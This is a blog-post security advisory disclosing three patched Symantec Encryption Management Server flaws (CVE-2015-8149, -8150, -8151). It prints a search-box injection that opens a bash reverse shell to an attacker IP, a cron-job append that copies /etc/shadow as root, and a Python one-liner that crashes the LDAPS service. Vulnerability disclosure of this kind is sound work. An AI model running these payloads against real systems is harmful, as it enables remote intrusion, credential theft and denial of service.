---
layout: post
title:  Symantec Encryption Management Server
date:   2016-06-07
author: TheXero
comments: true
categories: advisories
description: The Symantec Encryption Management Server is used by organisations of all sizes and typicly sites within an organisations DMZ. However, during an engagement, a number of serious security vulnerabilities were found within the appliance itself, many of which can lead to Remote Code Execution by an malicious attacker.
excerpt: During a security assessment back in 2015 I came across a fully patched Symantec Encryption Management Server appliance. This product provides secure messaging both between users of the organization...
tags: [symantec, advisory, exploit]
---

During a security assessment back in 2015 I came across a fully patched Symantec Encryption Management Server appliance. This product provides secure messaging both between users of the organization and with external users. Each server is managed via an internal administrative web interface. During research time, several issues were discovered and reported to to Symantec.

<h4>OS Command Execution</h4>
Using the administrative search functionality, it was found that user input was handled in an unsafe way. Insufficient validation of the supplied parameters exposed the search functionality to arbitrary command execution. This issue required a user account with low privileged access to the administrative interface. The lowest privilege user role with this level of access is Reporter.

The following text was entered into the search box, which launched a reverse TCP shell to the attackers IP.

    |`/bin/bash -i>& /dev/tcp/10.10.10.10/4444 0>&1`

The resulting reverse shell is executed as user tomcat.

CVE-2015-8151 was assigned to cover the above issue.

<h4>Local Privilege Escalation</h4>

The tomcat user had write access to the file /etc/cron.daily/tomcat.cron. The contents of this file were executed in the context of the root super-user account. Consequently, given command execution (see above), arbitrary commands could be scheduled for execution as root.

    $ ls -al /etc/cron.daily/tomcat.cron
    -rwxrwxr-x 1 root tomcat 88 Jul  6 03:58 /etc/cron.daily/tomcat.cron

As the tomcat user it was possible to append additional content to the daily tomcat cron job. For example, with the command below:

    $ echo 'cat /etc/shadow > /tmp/shadow' >> /etc/cron.daily/tomcat.cron

This cron job was executed is daily and with root privileges.

    $ ls -l /tmp/shadow
    -rw-r—r— 1 root root 825 Jul  6 04:02 /tmp/shadow
    $ cat /tmp/shadow
    root:!!:16612:0:99999:7:::
    bin:*:16612:0:99999:7:::
    daemon:*:16612:0:99999:7:::
    ...

CVE-2015-8150 was assigned to address this issue.

<h4>Heap Based Memory Corruption</h4>
It was also discovered a repeatable crash in the LDAPS service running on the appliance. This could be reproduced using the following simple python command line.

    $ python -c “import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘10.240.28.199’,636)); 
    s.send(‘803a01030100030000002e00000040404141414142424242434343434444313145454545464646464747474731314848494949494a4a4a4a4b4b4b4b’.decode( ‘hex’))”

This will trigger a SIGSEGV signal and the service will exit. Both the LDAP and LDAPS services will not be available until the service has been automatically restarted.

CVE-2015-8149 was assigned to address this issue.

Further details around the patches deployed for the appliance and the Symantec security advisory for these issues can be found at the following link: <a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/0/0/SYMSA1346" target="_blank">https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/0/0/SYMSA1346</a>
